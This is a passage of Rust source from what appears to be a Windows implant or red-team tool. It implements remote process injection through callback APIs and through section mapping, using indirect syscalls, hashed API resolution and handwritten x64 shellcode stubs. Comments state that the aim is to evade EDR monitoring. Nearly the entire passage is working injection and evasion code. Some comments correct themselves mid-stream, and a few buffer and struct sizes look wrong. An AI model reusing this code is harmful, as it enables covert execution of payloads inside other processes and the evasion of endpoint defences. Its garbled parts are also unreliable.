        caller.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, EnumFontFamiliesExW
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax

        // ReleaseDC(NULL, hdc) cleanup
        if let Some(release_fn) = release_dc {
            caller.extend_from_slice(&[0x31, 0xC9]); // xor ecx, ecx (hWnd=NULL)
            caller.extend_from_slice(&[0x48, 0xBA]); // mov rdx, hdc
            caller.extend_from_slice(&(hdc as u64).to_le_bytes());
            caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, ReleaseDC
            caller.extend_from_slice(&(release_fn as u64).to_le_bytes());
            caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        }

        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 9: CertEnumSystemStore ──────────────────────────────

fn inject_callback_cert_enum_system_store(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::CertEnumSystemStore),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        // CertEnumSystemStore is in crypt32.dll — load it dynamically.
        let cert_enum = resolve_external_dll_function(
            b"crypt32.dll\0",
            b"CertEnumSystemStore\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve CertEnumSystemStore from crypt32.dll".to_string(),
        })?;

        // CERT_SYSTEM_STORE_LOCAL_MACHINE = 0x00020000
        // CertEnumSystemStore(0x00020000, NULL, stub_base, NULL)
        let mut caller = Vec::with_capacity(48);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        // mov ecx, 0x00020000 (dwFlags)
        caller.extend_from_slice(&[0xB9, 0x00, 0x00, 0x02, 0x00]);
        caller.extend_from_slice(&[0x31, 0xD2]); // xor edx, edx (pvSystemStorePara=NULL)
        caller.extend_from_slice(&[0x49, 0xB8]); // mov r8, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x45, 0x31, 0xC0]); // xor r8d, r8d — wait, r8 is already set
        // Actually: arg3 = r8 = pfnEnum (callback), arg4 = r9 = pvArg (NULL)
        // r8 already has stub_base. Set r9 to NULL.
        caller.truncate(caller.len() - 3); // remove the xor r8d
        caller.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d (pvArg=NULL)
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, CertEnumSystemStore
        caller.extend_from_slice(&(cert_enum as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 10: SHEnumerateUnreadMailAccountsW ──────────────────

fn inject_callback_sh_enum_unread_mail(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::SHEnumerateUnreadMailAccounts),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        // SHEnumerateUnreadMailAccountsW is in shell32.dll.
        let enum_func = resolve_external_dll_function(
            b"shell32.dll\0",
            b"SHEnumerateUnreadMailAccountsW\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve SHEnumerateUnreadMailAccountsW from shell32.dll".to_string(),
        })?;

        // SHEnumerateUnreadMailAccountsW(NULL, 0, stub_base, 0)
        let mut caller = Vec::with_capacity(48);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x31, 0xC9]); // xor ecx, ecx (hKey=NULL)
        caller.extend_from_slice(&[0x31, 0xD2]); // xor edx, edx (dwFlags=0)
        caller.extend_from_slice(&[0x49, 0xB8]); // mov r8, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d (pvArg=0... actually this is cbCallback)
        // Actually SHEnumerateUnreadMailAccountsW signature:
        // HRESULT SHEnumerateUnreadMailAccountsW(HKEY hKey, DWORD dwFlags, pfnEnum, LPARAM)
        // 4 args: rcx=hKey, rdx=dwFlags, r8=pfnEnum, r9=lParam
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, SHEnumerateUnreadMailAccountsW
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 11: EnumerateLoadedModulesW64 ───────────────────────

fn inject_callback_enumerate_loaded_modules(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::EnumerateLoadedModules),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        // EnumerateLoadedModulesW64 is in dbghelp.dll.
        let enum_func = resolve_external_dll_function(
            b"dbghelp.dll\0",
            b"EnumerateLoadedModulesW64\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve EnumerateLoadedModulesW64 from dbghelp.dll".to_string(),
        })?;

        // We need a process handle. Use GetCurrentProcess for self-enumeration,
        // or DuplicateHandle to get one for the target.
        // Actually, EnumerateLoadedModulesW64 takes a HANDLE from
        // CreateToolhelp32Snapshot or similar. For our purposes, we pass
        // the current process handle ( GetCurrentProcess() ).
        let get_current_process = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"GetCurrentProcess\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve GetCurrentProcess".to_string(),
        })?;
        let get_cur_proc: extern "system" fn() -> *mut c_void =
            std::mem::transmute(get_current_process);
        let h_snap = get_cur_proc();

        // EnumerateLoadedModulesW64(hProcess, stub_base, NULL)
        // Actually signature: EnumerateLoadedModulesW64(HANDLE hProcess,
        //   PENUMLOADED_MODULES_CALLBACKW64 EnumLoadedModulesCallback,
        //   PVOID UserContext)
        let mut caller = Vec::with_capacity(48);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, hProcess
        caller.extend_from_slice(&(h_snap as u64).to_le_bytes());
        caller.extend_from_slice(&[0x48, 0xBA]); // mov rdx, stub_base
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x4D, 0x31, 0xC0]); // xor r8d, r8d (UserContext=NULL)
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, EnumerateLoadedModulesW64
        caller.extend_from_slice(&(enum_func as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

// ── Callback API Variant 12: CopyFileExW ─────────────────────────────────────

fn inject_callback_copy_file_ex(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::CallbackInjection {
        target_pid: pid,
        api: Some(CallbackApi::CopyFileEx),
    };
    unsafe {
        let (h_proc, payload_base, stub_base) = stage_callback_payload(pid, payload, technique.clone())?;

        let copy_file_ex = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"CopyFileExW\0",
        )
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: technique.clone(),
            reason: "cannot resolve CopyFileExW".to_string(),
        })?;

        // Create temporary source and destination file paths.
        // We write wide strings for: src = "C:\__la_cb_src.tmp", dst = "C:\__la_cb_dst.tmp"
        let src_path: Vec<u16> = r"C:\__la_cb_src.tmp\0".encode_utf16().collect();
        let dst_path: Vec<u16> = r"C:\__la_cb_dst.tmp\0".encode_utf16().collect();

        // Write both path strings into the target process.
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
        let mut remote_src: *mut c_void = std::ptr::null_mut();
        let mut src_size = src_path.len() * 2;
        let _ = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut remote_src as *mut _ as u64,
            0u64,
            &mut src_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        let mut written = 0usize;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            remote_src as u64,
            src_path.as_ptr() as u64,
            (src_path.len() * 2) as u64,
            &mut written as *mut _ as u64,
        );

        let mut remote_dst: *mut c_void = std::ptr::null_mut();
        let mut dst_size = dst_path.len() * 2;
        let _ = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut remote_dst as *mut _ as u64,
            0u64,
            &mut dst_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        let mut written = 0usize;
        let _ = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            remote_dst as u64,
            dst_path.as_ptr() as u64,
            (dst_path.len() * 2) as u64,
            &mut written as *mut _ as u64,
        );

        // Create the source file locally so CopyFileExW has something to copy.
        // Actually, we need to create it in the target process. Let's create
        // a simple caller stub that:
        //   1. CreateFileW(src, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL)
        //   2. Write 1 byte to it
        //   3. CloseHandle
        //   4. CopyFileExW(src, dst, stub_base, NULL, NULL, 0)
        //   5. DeleteFileW(src)
        //   6. DeleteFileW(dst)
        //
        // This is complex for a stub. Instead, use a simpler approach:
        // Create the temp file locally (NtCreateFile in current process),
        // then just call CopyFileExW with the callback. Delete after.

        // Create source file using NtCreateFile.
        let src_path_nt: Vec<u16> = r"\??\C:\__la_cb_src.tmp\0".encode_utf16().collect();
        let mut src_str = winapi::shared::ntdef::UNICODE_STRING {
            Length: ((src_path_nt.len() - 1) * 2) as u16,
            MaximumLength: (src_path_nt.len() * 2) as u16,
            Buffer: src_path_nt.as_ptr() as *mut _,
        };
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut src_str;
        obj_attr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

        let mut io_status_block: [u64; 2] = [0; 0];
        let mut h_file: usize = 0;
        let _ = nt_syscall::syscall!(
            "NtCreateFile",
            &mut h_file as *mut _ as u64,
            0x40000000u64, // GENERIC_WRITE
            &mut obj_attr as *mut _ as u64,
            io_status_block.as_mut_ptr() as u64,
            0u64, // AllocationSize
            0x80u64, // FILE_ATTRIBUTE_NORMAL
            0u64, // ShareAccess
            2u64, // FILE_OVERWRITE_IF (create or overwrite)
            0u64, // CreateOptions (non-directory)
            0u64, // EaBuffer
            0u64, // EaLength
        );

        if h_file != 0 {
            // Write a single byte so the file is non-empty.
            let byte = [0x20u8; 1];
            let mut written_local = 0usize;
            let _ = nt_syscall::syscall!(
                "NtWriteFile",
                h_file as u64,
                0u64, // Event
                0u64, // ApcRoutine
                0u64, // ApcContext
                io_status_block.as_mut_ptr() as u64,
                byte.as_ptr() as u64,
                byte.len() as u64,
                0u64, // ByteOffset
                0u64, // Key
            );
            let _ = nt_syscall::syscall!("NtClose", h_file as u64);
        }

        // Build caller stub:
        // CopyFileExW(remote_src, remote_dst, stub_base, NULL, NULL, 0)
        // Then: DeleteFileW(remote_src), DeleteFileW(remote_dst)
        let delete_file_w = resolve_dll_function(
            pe_resolve::hash_str(b"kernel32.dll\0"),
            b"DeleteFileW\0",
        );

        let mut caller = Vec::with_capacity(128);
        caller.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]); // sub rsp, 0x28
        caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_src
        caller.extend_from_slice(&(remote_src as u64).to_le_bytes());
        caller.extend_from_slice(&[0x48, 0xBA]); // mov rdx, remote_dst
        caller.extend_from_slice(&(remote_dst as u64).to_le_bytes());
        caller.extend_from_slice(&[0x49, 0xB8]); // mov r8, stub_base (progress callback)
        caller.extend_from_slice(&(stub_base as u64).to_le_bytes());
        caller.extend_from_slice(&[0x45, 0x31, 0xC9]); // xor r9d, r9d (pvData=NULL)
        // mov qword [rsp+0x20], 0 (pbCancel=NULL)
        caller.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
        // mov dword [rsp+0x28], 0 (dwCopyFlags=0)
        caller.extend_from_slice(&[0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]);
        caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, CopyFileExW
        caller.extend_from_slice(&(copy_file_ex as u64).to_le_bytes());
        caller.extend_from_slice(&[0xFF, 0xD0]); // call rax

        // DeleteFileW(remote_src)
        if let Some(del_fn) = delete_file_w {
            caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_src
            caller.extend_from_slice(&(remote_src as u64).to_le_bytes());
            caller.extend_from_slice(&[0x48, 0xB8]); // mov rax, DeleteFileW
            caller.extend_from_slice(&(del_fn as u64).to_le_bytes());
            caller.extend_from_slice(&[0xFF, 0xD0]); // call rax

            // DeleteFileW(remote_dst)
            caller.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_dst
            caller.extend_from_slice(&(remote_dst as u64).to_le_bytes());
            caller.extend_from_slice(&[0xFF, 0xD0]); // call rax
        }

        caller.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]); // add rsp, 0x28
        caller.push(0xC3); // ret

        let caller_remote = write_and_exec_stub(h_proc, &caller, technique.clone())?;
        let h_thread = create_suspended_thread(h_proc, caller_remote)?;
        let _ = nt_syscall::syscall!("NtResumeThread", h_thread as u64, 0u64);
        let _ = nt_syscall::syscall!("NtClose", h_thread as u64);

        Ok(InjectionHandle {
            target_pid: pid,
            technique_used: technique,
            injected_base_addr: payload_base,
            payload_size: payload.len(),
            thread_handle: None,
            process_handle: h_proc,
            sleep_enrolled: false,
            sleep_stub_addr: 0,
        })
    }
}

/// Helper: write a caller stub to the target process and return its address.
///
/// Allocates RW memory, writes the stub bytes, flips to RX, flushes I-cache.
/// Returns the remote address of the stub.
unsafe fn write_and_exec_stub(
    h_proc: *mut c_void,
    stub: &[u8],
    _technique: InjectionTechnique,
) -> Result<usize, InjectionError> {
    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};

    let mut remote_stub: *mut c_void = std::ptr::null_mut();
    let mut stub_size = stub.len();
    let s = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        h_proc as u64,
        &mut remote_stub as *mut _ as u64,
        0u64,
        &mut stub_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    if s.is_err() || s.unwrap() < 0 || remote_stub.is_null() {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::CallbackInjection {
                target_pid: 0,
                api: None,
            },
            reason: "NtAllocateVirtualMemory for caller stub failed".to_string(),
        });
    }

    let mut written = 0usize;
    let _ = nt_syscall::syscall!(
        "NtWriteVirtualMemory",
        h_proc as u64,
        remote_stub as u64,
        stub.as_ptr() as u64,
        stub.len() as u64,
        &mut written as *mut _ as u64,
    );

    let mut old_prot = 0u32;
    let mut prot_base = remote_stub as usize;
    let mut prot_size = stub.len();
    let _ = nt_syscall::syscall!(
        "NtProtectVirtualMemory",
        h_proc as u64,
        &mut prot_base as *mut _ as u64,
        &mut prot_size as *mut _ as u64,
        PAGE_EXECUTE_READ as u64,
        &mut old_prot as *mut _ as u64,
    );
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        h_proc as u64,
        remote_stub as u64,
        stub.len() as u64,
    );

    Ok(remote_stub as usize)
}

// ── NEW: Section Mapping injection ───────────────────────────────────────────
//
// Creates a shared memory section, writes payload locally, maps into target.
// Avoids NtWriteVirtualMemory entirely — one of the top 3 most-hooked NT APIs.
//
// Algorithm:
//   1. NtCreateSection (PAGE_EXECUTE_READWRITE or PAGE_READWRITE, SEC_COMMIT)
//   2. NtMapViewOfSection → local process (PAGE_READWRITE) → write payload
//   3. NtUnmapViewOfSection → local process
//   4. NtMapViewOfSection → target process (PAGE_EXECUTE_READ or PAGE_READWRITE)
//   5. [Enhanced] NtProtectVirtualMemory → target: RW → RX
//   6. Execute via APC / Thread / Callback
//   7. Cleanup: NtClose section handle
//
// All NT API calls go through indirect syscalls via nt_syscall::syscall! macro.

/// Open the target process with the access rights needed for section mapping.
///
/// Required rights: `PROCESS_VM_OPERATION` (for NtMapViewOfSection),
/// `PROCESS_QUERY_INFORMATION` (for thread enumeration if using APC),
/// `PROCESS_CREATE_THREAD` (if using thread execution).
unsafe fn open_target_for_section_map(
    pid: u32,
    need_create_thread: bool,
) -> Result<*mut c_void, InjectionError> {
    use winapi::um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
    };

    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    let mut h_proc: usize = 0;
    let mut access_mask = (PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION) as u64;
    if need_create_thread {
        access_mask |= PROCESS_CREATE_THREAD as u64;
    }

    let open_status = nt_syscall::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        access_mask,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );

    if open_status.is_err() || open_status.unwrap() < 0 || h_proc == 0 {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::SectionMapping {
                target_pid: pid,
                exec_method: None,
                enhanced: false,
            },
            reason: format!("NtOpenProcess({}) failed for section mapping", pid),
        });
    }

    Ok(h_proc as *mut c_void)
}

/// Align `size` up to the next page boundary (0x1000).
fn page_align(size: usize) -> usize {
    const PAGE_SIZE: usize = 0x1000;
    (size + PAGE_SIZE - 1) & !(PAGE_SIZE - 1)
}

/// Find an alertable thread in the target process by enumerating threads
/// and checking which ones are in an alertable wait state.
///
/// Returns the thread handle and TID if found. Uses NtQuerySystemInformation
/// to enumerate threads, then NtOpenThread + NtQueryInformationThread to
/// check if the thread is alertable.
unsafe fn find_alertable_thread(
    h_proc: *mut c_void,
    pid: u32,
) -> Option<(*mut c_void, u32)> {
    use winapi::um::winnt::{THREAD_QUERY_INFORMATION, THREAD_SET_CONTEXT};

    // Query system thread information to find threads in the target process.
    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;

    let nt_query_info = pe_resolve::get_proc_address_by_hash(
        ntdll_base,
        pe_resolve::hash_str(b"NtQuerySystemInformation\0"),
    )?;

    type NtQuerySystemInformationFn = unsafe extern "system" fn(
        u32,              // SystemInformationClass (SystemProcessInformation = 5)
        *mut c_void,      // SystemInformation
        u32,              // SystemInformationLength
        *mut u32,         // ReturnLength
    ) -> i32;

    let query_fn: NtQuerySystemInformationFn = std::mem::transmute(nt_query_info);

    // SystemProcessInformation = 5
    let mut buf_size = 0x10000u32;
    let mut buf: Vec<u8> = Vec::with_capacity(buf_size as usize);
    let mut ret_len = 0u32;

    let status = query_fn(
        5,
        buf.as_mut_ptr() as *mut c_void,
        buf_size,
        &mut ret_len,
    );

    if status < 0 && status != 0x00000105 /* STATUS_INFO_LENGTH_MISMATCH */ {
        return None;
    }

    // Iterate through processes to find our target PID.
    let mut offset = 0usize;
    loop {
        if offset + std::mem::size_of::<u64>() * 20 > buf_size as usize {
            break;
        }
        let ptr = buf.as_ptr().wrapping_add(offset);
        // SYSTEM_PROCESS_INFORMATION layout:
        //   +0x00: NextEntryOffset (u32)
        //   +0x04: NumberOfThreads (u32)
        //   ...
        //   +0x40: UniqueProcessId (ptr / u64 on x64)
        //   ...
        let next_entry = *(ptr as *const u32);
        let num_threads = *((ptr as *const u8).add(4) as *const u32);
        // UniqueProcessId is at offset 0x40 on x64
        let proc_pid = *((ptr as *const u8).add(0x40) as *const u64) as u32;

        if proc_pid == pid && num_threads > 0 {
            // Thread array starts at offset 0x70 on x64
            // Each SYSTEM_THREAD_INFORMATION is 0x40 bytes on x64
            //   +0x00: KERNEL_USER_TIMES (0x20 bytes)
            //   +0x20: StartAddress
            //   +0x28: ClientId (UniqueProcess, UniqueThread — two u64)
            //   +0x38: Priority
            //   +0x3C: BasePriority (or similar)
            //
            // Actually, SYSTEM_THREAD_INFORMATION:
            //   +0x00: KERNEL_USER_TIMES (0x20 bytes)
            //   +0x20: StartAddress (ptr)
            //   +0x28: ClientId (two u64: pid, tid)
            //   +0x38: Priority (i32)
            //   +0x3C: BasePriority (i32)
            //   +0x40: ContextSwitchCount (u32)
            //   +0x44: State (u32)
            //   +0x48: WaitReason (u32)
            let thread_base = (ptr as *const u8).add(0x70);
            for i in 0..num_threads as usize {
                let t_ptr = thread_base.wrapping_add(i * 0x50); // sizeof varies
                let tid = *(t_ptr.add(0x28 + 8) as *const u64) as u32;

                // Try to open this thread.
                let mut cid = [0u64; 2];
                cid[0] = pid as u64;
                cid[1] = tid as u64;
                let mut t_obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
                t_obj_attr.Length =
                    std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

                let mut h_thread: usize = 0;
                let thread_access = (THREAD_QUERY_INFORMATION | THREAD_SET_CONTEXT) as u64;
                let t_status = nt_syscall::syscall!(
                    "NtOpenThread",
                    &mut h_thread as *mut _ as u64,
                    thread_access,
                    &mut t_obj_attr as *mut _ as u64,
                    cid.as_mut_ptr() as u64,
                );

                if t_status.is_ok() && t_status.unwrap() >= 0 && h_thread != 0 {
                    // Check if the thread is alertable via NtQueryInformationThread
                    // ThreadIsIoPending or by checking wait reason.
                    // For simplicity, return the first thread we can open that
                    // has a valid handle. APC delivery requires the thread to
                    // enter an alertable wait — we'll queue the APC and let the
                    // system handle delivery when the thread calls
                    // SleepEx/WaitForSingleObjectEx with alertable=TRUE.
                    return Some((h_thread as *mut c_void, tid));
                }
            }
        }

        if next_entry == 0 {
            break;
        }
        offset += next_entry as usize;
    }

    None
}

/// Main section mapping injection dispatcher.
///
/// Creates a shared section, writes payload locally, maps into target, executes.
/// If `exec_method` is None, auto-selects: APC if an alertable thread is found,
/// else Thread. If `enhanced` is true, uses the double-mapped variant (RW →
/// NtProtectVirtualMemory → RX) to evade EDR that monitors executable section
/// mappings into remote processes.
fn inject_section_mapping(
    pid: u32,
    payload: &[u8],
    exec_method: Option<SectionExecMethod>,
    enhanced: bool,
) -> Result<InjectionHandle, InjectionError> {
    let technique = InjectionTechnique::SectionMapping {
        target_pid: pid,
        exec_method,
        enhanced,
    };

    unsafe {
        // ── Step 1: Create a shared section ────────────────────────────
        //
        // NtCreateSection(
        //   &h_section,
        //   SECTION_ALL_ACCESS,
        //   NULL,               // ObjectAttributes
        //   &large_size,        // MaximumSize (aligned to page)
        //   section_protection, // PAGE_READWRITE (enhanced) or PAGE_EXECUTE_READWRITE
        //   SEC_COMMIT,
        //   NULL                // FileHandle (pagefile-backed)
        // )

        let aligned_size = page_align(payload.len());
        let mut large_size: i64 = aligned_size as i64;

        // Section protection: PAGE_READWRITE for enhanced variant,
        // PAGE_EXECUTE_READWRITE for standard variant.
        let section_protection: u64 = if enhanced {
            0x04 // PAGE_READWRITE
        } else {
            0x40 // PAGE_EXECUTE_READWRITE
        };

        // SEC_COMMIT = 0x8000000
        // SECTION_ALL_ACCESS = 0x000F001F
        let mut h_section: usize = 0;
        let create_status = nt_syscall::syscall!(
            "NtCreateSection",
            &mut h_section as *mut _ as u64,
            0x000F_001Fu64, // SECTION_ALL_ACCESS
            0u64,            // ObjectAttributes = NULL
            &mut large_size as *mut _ as u64,
            section_protection,
            0x0800_0000u64, // SEC_COMMIT
            0u64,            // FileHandle = NULL (pagefile-backed)
        );

        if create_status.is_err() || create_status.unwrap() < 0 || h_section == 0 {
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: format!(
                    "NtCreateSection failed: status={:?}",
                    create_status
                ),
            });
        }

        // ── Step 2: Map locally as RW and write payload ───────────────
        //
        // NtMapViewOfSection(
        //   h_section,
        //   NtCurrentProcess,   // (-1isize) as u64
        //   &local_base,
        //   0,                  // ZeroBits
        //   0,                  // CommitSize
        //   NULL,               // SectionOffset
        //   &view_size,
        //   ViewUnmap = 2,      // InheritDisposition
        //   0,                  // AllocationType
        //   PAGE_READWRITE = 0x04
        // )

        let mut local_base: *mut c_void = std::ptr::null_mut();
        let mut view_size: usize = 0;

        let map_local_status = nt_syscall::syscall!(
            "NtMapViewOfSection",
            h_section as u64,
            (-1isize) as u64, // NtCurrentProcess()
            &mut local_base as *mut _ as u64,
            0u64,             // ZeroBits
            0u64,             // CommitSize
            0u64,             // SectionOffset = NULL
            &mut view_size as *mut _ as u64,
            2u64,             // ViewUnmap
            0u64,             // AllocationType
            0x04u64,          // PAGE_READWRITE
        );

        if map_local_status.is_err() || map_local_status.unwrap() < 0 || local_base.is_null() {
            let _ = nt_syscall::syscall!("NtClose", h_section as u64);
            return Err(InjectionError::InjectionFailed {
                technique: technique.clone(),
                reason: format!(
                    "NtMapViewOfSection(local) failed: status={:?}",
                    map_local_status
                ),
            });
        }

        // Write payload into local mapping.
        std::ptr::copy_nonoverlapping(
            payload.as_ptr(),
            local_base as *mut u8,
            payload.len(),
        );

        // Unmap from our process — the section object retains the data.
        let _ = nt_syscall::syscall!(
            "NtUnmapViewOfSection",
            (-1isize) as u64, // NtCurrentProcess()
            local_base as u64,
        );

        // ── Step 3: Open target process ────────────────────────────────
        //
        // Determine access rights based on execution method.
        let need_thread = exec_method.unwrap_or(SectionExecMethod::Thread)
            == SectionExecMethod::Thread;
        let h_proc = open_target_for_section_map(pid, need_thread)
            .map_err(|e| {
                let _ = nt_syscall::syscall!("NtClose", h_section as u64);
                e
            })?;

        // ── Step 4: Map into target process ────────────────────────────
        //
        // Standard: map as PAGE_EXECUTE_READ (0x20)
        // Enhanced: map as PAGE_READWRITE (0x04), then NtProtectVirtualMemory to RX

        let target_protection: u64 = if enhanced {
            0x04 // PAGE_READWRITE (will flip to RX after)
        } else {
            0x20 // PAGE_EXECUTE_READ
        };

        let mut remote_base: *mut c_void = std::ptr::null_mut();
        let mut remote_view_size: usize = 0;

        let map_target_status = nt_syscall::syscall!(
            "NtMapViewOfSection",
            h_section as u64,
            h_proc as u64,
            &mut remote_base as *mut _ as u64,
            0u64,                // ZeroBits
            0u64,                // CommitSize
            0u64,                // SectionOffset = NULL
            &mut remote_view_size as *mut _ as u64,
            2u64,                // ViewUnmap
            0u64,                // AllocationType
            target_protection,
        );

